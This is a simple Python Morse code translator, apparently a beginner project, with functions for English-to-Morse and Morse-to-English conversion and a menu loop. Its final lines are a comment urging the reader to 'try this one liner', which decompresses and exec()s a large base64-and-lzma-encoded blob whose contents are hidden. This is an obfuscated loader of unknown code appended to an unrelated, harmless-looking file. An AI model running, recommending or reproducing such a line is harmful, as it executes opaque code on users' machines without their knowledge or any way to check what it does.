#BB 1st Simple Morse Code Translator Project

# Tuple of English characters
english_letters = (
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
    "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
    "u", "v", "w", "x", "y", "z", " ", " "
)

# Tuple of Morse Code symbols (matching index positions)
morse_symbols = (
    ".-", "-...", "-.-.", "-..", ".", "..-.", "--.", "....", "..", ".---",
    "-.-", ".-..", "--", "-.", "---", ".--.", "--.-", ".-.", "...", "-",
    "..-", "...-", ".--", "-..-", "-.--", "--..", "/", "^" #last 2 are spaces between words
)


#English to Morse Code
def english_to_morse(message):
    #Convert an English message into Morse Code.
    morse_output = ""

    for char in message.lower():
        if char in english_letters:
            index = english_letters.index(char)
            morse_output += morse_symbols[index] + " "
        else:
            # Error handling for unsupported characters
            morse_output += "[?] "

    return morse_output.strip()


#Morse Code to English
def morse_to_english(code):
    #Convert Morse Code into an English message.
    english_output = ""

    # Split Morse code by spaces
    morse_chars = code.split()

    for symbol in morse_chars:
        if symbol in morse_symbols:
            index = morse_symbols.index(symbol)
            english_output += english_letters[index]
        else:
            # Error handling for unsupported Morse symbols
            english_output += "?"

    return english_output


# MAIN PROGRAM LOOP
def main():
    print("Welcome to the Morse Code Translator!")
    print("You can translate English to Morse Code or Morse Code to English.\n")

    while True:
        print("MAIN MENU:")
        print("1. Translate from Morse Code to English")
        print("2. Translate from English to Morse Code")
        print("3. Exit\n")

        choice = input("Enter your choice (1-3): ")

        #Morse to English
        if choice == "1":
            print("\nMORSE CODE TO ENGLISH:")
            code = input("What is the code you need translated?\n")
            translation = morse_to_english(code)
            print("\nYour message says:\n")
            print(translation + "\n")

        #English to Morse
        elif choice == "2":
            print("\nENGLISH TO MORSE CODE:")
            message = input("What is the message you need translated?\n")
            translation = english_to_morse(message)
            print("\nYour message says:\n")
            print(translation + "\n")

        #Exit
        elif choice == "3":
            print("\nThank you for using the Morse Code Translator. Goodbye!")
            break

        # Invalid menu choice
        else:
            print("\nInvalid choice. Please enter 1, 2, or 3.\n")


# Run the program
main()

#Try this one liner
#import lzma, base64; exec(lzma.decompress(base64.b64decode("/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AiHAsxdAAUaS3MbhM/CkuC8s1LU3qWkdrAk4HX/38SQLdAtm6MM8I72ZtMefCtvzjuGtwaZ2SM/H+mRmqrYV1Rmb4Qghiog4Ov+iuS8JWaOo6MMYJlj0DF9uQWV5ueoKLOlul83CcLnvgRQPt+I70Lq6id/EA4p4+aAwNaD4eGgBXdj84p2X6aQP2iSZg6bGK4W9PXST9K5gVYhBvPrt+HTbK7we3XwZhWuCNyUitPjs90a1dY5mGUQ9gCYmUE4X8xQHrSTYAQFzKuMiO2TnL8BuB0BSaQFpLaFvDvScoi91l+P7TQvca3QqxvQYKackWjD0Vlq2CgzDsVl5alHZLR9W9dDc81Xm+ZVjiUu9XCYoMkgbxGeMy41ND/XB8Zw3vA1XkEYXyjZxfJ56ONG9uWVSelVYlRMAfJ+JokwWCDKVMM6R/7TcjP41PYOY9RsMp6kQTFJyngWH2aVx+I11zqWL5hYNpvznj1YgSbCuDYJ2DdCpmHACTNzN+LYRMfvOGUCa969LnCosPbIR7nyzHHGbG6lQCD/YbOpYzpwqq3xLWo99aI28ik64G6ysVlfOrfvUywGCOPyBKXObMcWAUGS9gIzJrnMX6In767zkxPztHUoLMGulqpMqmrLBRfItMWhAJF1AHQ3agXPsostU8AlM/cBlF+XnoQOBCU3PVp1X/xwiKCP8+JhAkv7Jz11zxuCIwTgNewUQ88q/748xDXXGZ0aX9VKNKWu2rfiD7ZvhGwS2R/tNB7Jg6LnXyjzWPEydoRiqnS3It5TnEyTpztX6u/cAE5QIpNTWxIwrR2BjZ6vIfaRIyDmIj5HnCPvqrOx70JRNqskgKYBVmeZyQujNYnRwadpgdKwwixM3ruuN6bu24hZf8IJMSDAvZRZr2rClh4ItBcvmtGv9JR81pWw3YuFc6MFzu89U/lXN8oVtCCri9ib0C3P4c3ITzFnP2EWALkfcwa+ednpAAHoBYgRAADRlavEscRn+wIAAAAABFla")).decode())